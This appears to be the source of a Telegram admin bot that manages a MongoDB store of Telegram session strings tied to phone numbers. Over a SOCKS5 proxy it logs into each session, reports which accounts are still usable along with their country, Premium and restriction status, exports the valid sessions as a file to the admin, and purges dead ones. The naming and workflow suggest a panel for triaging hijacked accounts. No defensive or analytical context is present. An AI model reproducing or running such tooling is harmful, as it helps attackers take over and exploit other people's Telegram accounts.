import os
import json
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from dotenv import load_dotenv
from pymongo import MongoClient
from telethon import TelegramClient
from telethon.sessions import StringSession
from phonenumbers import parse, geocoder

# Load env variables
load_dotenv()

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
PANEL_TOKEN = os.getenv("PANEL_BOT_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")
ADMIN_ID = int(os.getenv("ADMIN_ID"))

PROXY_HOST = os.getenv("PROXY_HOST")
PROXY_PORT = int(os.getenv("PROXY_PORT"))
PROXY_USER = os.getenv("PROXY_USER")
PROXY_PASS = os.getenv("PROXY_PASS")
proxy = ('socks5', PROXY_HOST, PROXY_PORT, True, PROXY_USER, PROXY_PASS)

mongo = MongoClient(MONGO_URI)
db = mongo["dbmango"]
sessions_col = db["sessions"]

logging.basicConfig(level=logging.INFO)
bot = Bot(token=PANEL_TOKEN)
dp = Dispatcher(bot)

@dp.message_handler(commands=['log'])
async def cmd_log(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return

    sessions = list(sessions_col.find({}))
    if not sessions:
        await message.answer("❌ Нет сессий в базе данных.")
        return

    await message.answer("🔍 Проверка всех сессий...")

    results = []
    for session in sessions:
        phone = session.get("phone")
        session_str = session.get("session")
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH, proxy=proxy)
        try:
            await client.connect()
            auth = await client.is_user_authorized()
            if not auth:
                results.append(f"❌ {phone} — невалид")
            else:
                me = await client.get_me()
                country = geocoder.description_for_number(parse(phone, None), "en")
                premium = getattr(me, 'premium', False)
                blocked = bool(getattr(me, 'restriction_reason', []))
                results.append(
                    f"✅ {phone} | {country} | Premium: {'Yes' if premium else 'No'} | Blocked: {'Yes' if blocked else 'No'}"
                )
        except Exception as e:
            results.append(f"❌ {phone} — ошибка: {e}")
        finally:
            await client.disconnect()

    # Отправка результатами по частям
    text = "\n".join(results)
    for chunk in [text[i:i+4000] for i in range(0, len(text), 4000)]:
        await message.answer(chunk)

@dp.message_handler(commands=['loger'])
async def cmd_loger(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return

    sessions = list(sessions_col.find({}))
    valid_sessions = []

    for session in sessions:
        phone = session.get("phone")
        session_str = session.get("session")
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH, proxy=proxy)
        try:
            await client.connect()
            if await client.is_user_authorized():
                valid_sessions.append({"phone": phone, "session": session_str})
        except:
            pass
        finally:
            await client.disconnect()

    if not valid_sessions:
        await message.answer("❌ Нет валидных сессий.")
        return

    with open("valid_sessions.txt", "w") as f:
        json.dump(valid_sessions, f, indent=2)

    await message.answer_document(open("valid_sessions.txt", "rb"))

@dp.message_handler(commands=['validel'])
async def cmd_validel(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return

    sessions = list(sessions_col.find({}))
    deleted = 0

    for session in sessions:
        session_str = session.get("session")
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH, proxy=proxy)
        try:
            await client.connect()
            if not await client.is_user_authorized():
                sessions_col.delete_one({"_id": session["_id"]})
                deleted += 1
        except:
            sessions_col.delete_one({"_id": session["_id"]})
            deleted += 1
        finally:
            await client.disconnect()

    await message.answer(f"🧹 Удалено невалидных сессий: {deleted}")

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
